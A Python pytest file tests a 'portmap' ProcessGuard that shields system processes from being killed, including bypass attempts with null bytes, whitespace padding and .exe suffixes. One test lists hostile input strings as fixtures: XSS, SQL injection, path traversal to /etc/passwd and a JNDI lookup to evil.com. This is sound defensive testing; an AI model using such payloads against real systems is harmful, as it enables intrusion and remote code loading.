from portmap.models import ProcessInfo
from portmap.guard import ProcessGuard


def _make_process(pid=1000, name="myapp", username="user1"):
    return ProcessInfo(
        pid=pid, name=name, cmdline=name,
        username=username, create_time=1000.0, memory_mb=50.0,
    )


# 1. is_protected True for PID <= 4
def test_is_protected_low_pid():
    guard = ProcessGuard()
    for pid in (0, 1, 4):
        proc = _make_process(pid=pid, name="normalapp", username="user1")
        assert guard.is_protected(proc) is True


# 2. is_protected True for system process names
def test_is_protected_system_process_names():
    guard = ProcessGuard()
    for name in ('sshd', 'systemd', 'init', 'dockerd', 'lsass'):
        proc = _make_process(name=name)
        assert guard.is_protected(proc) is True


# 3. is_protected True for root/SYSTEM user
def test_is_protected_root_system_user():
    guard = ProcessGuard()
    proc_root = _make_process(username="root")
    proc_system = _make_process(username="SYSTEM")
    assert guard.is_protected(proc_root) is True
    assert guard.is_protected(proc_system) is True


# 4. is_protected False for normal process
def test_is_protected_false_for_normal():
    guard = ProcessGuard()
    proc = _make_process(pid=5000, name="myapp", username="user1")
    assert guard.is_protected(proc) is False


# 5. can_kill returns (False, reason) for protected
def test_can_kill_protected():
    guard = ProcessGuard()
    proc = _make_process(pid=1, name="init")
    ok, reason = guard.can_kill(proc)
    assert ok is False
    assert "Protected system process" in reason
    assert "init" in reason


# 6. can_kill returns (True, "OK") for normal
def test_can_kill_normal():
    guard = ProcessGuard()
    proc = _make_process(pid=5000, name="myapp", username="user1")
    ok, reason = guard.can_kill(proc)
    assert ok is True
    assert reason == "OK"


# 7. Custom extra_protected works
def test_extra_protected():
    guard = ProcessGuard(extra_protected={"mycriticalapp"})
    proc = _make_process(name="mycriticalapp")
    assert guard.is_protected(proc) is True
    # Normal processes still not protected
    proc2 = _make_process(name="otherapp")
    assert guard.is_protected(proc2) is False


# 8. Windows system processes protected
def test_windows_system_processes():
    guard = ProcessGuard()
    for name in ('wininit', 'csrss', 'lsass', 'services', 'svchost', 'explorer', 'winlogon'):
        proc = _make_process(name=name)
        assert guard.is_protected(proc) is True, f"{name} should be protected"


# 9. Malicious process names should not crash guard
def test_guard_handles_malicious_process_names():
    guard = ProcessGuard()
    evil_names = [
        "<script>alert('xss')</script>",
        "'; DROP TABLE processes; --",
        "\x00\x01\x02\x03",
        "a" * 10000,  # Very long name
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "proc\nnewline\ttab",
    ]
    for name in evil_names:
        proc = _make_process(pid=5000, name=name, username="user1")
        # Should not raise, should return False (not a protected process)
        assert guard.is_protected(proc) is False
        ok, reason = guard.can_kill(proc)
        assert ok is True


# 10. Guard with empty string process name
def test_guard_empty_process_name():
    guard = ProcessGuard()
    proc = _make_process(pid=5000, name="", username="user1")
    assert guard.is_protected(proc) is False
    ok, reason = guard.can_kill(proc)
    assert ok is True


# 11. Guard detects protected process with null byte padding bypass attempt
def test_guard_null_byte_bypass():
    guard = ProcessGuard()
    proc = _make_process(pid=5000, name="sshd\x00", username="user1")
    assert guard.is_protected(proc) is True
    proc2 = _make_process(pid=5000, name="\x00sshd", username="user1")
    assert guard.is_protected(proc2) is True


# 12. Guard detects Windows .exe suffix protected processes
def test_guard_exe_suffix():
    guard = ProcessGuard()
    proc = _make_process(pid=5000, name="sshd.exe", username="user1")
    assert guard.is_protected(proc) is True
    proc2 = _make_process(pid=5000, name="SVCHOST.EXE", username="user1")
    assert guard.is_protected(proc2) is True
    # Non-protected .exe should still be killable
    proc3 = _make_process(pid=5000, name="myapp.exe", username="user1")
    assert guard.is_protected(proc3) is False


# 13. Guard detects whitespace-padded process names
def test_guard_whitespace_padding():
    guard = ProcessGuard()
    proc = _make_process(pid=5000, name="  sshd  ", username="user1")
    assert guard.is_protected(proc) is True


# 14. Guard detects whitespace-padded usernames
def test_guard_username_padding():
    guard = ProcessGuard()
    proc = _make_process(pid=5000, name="normalapp", username=" root ")
    assert guard.is_protected(proc) is True
    proc2 = _make_process(pid=5000, name="normalapp", username="SYSTEM\x00")
    assert guard.is_protected(proc2) is True
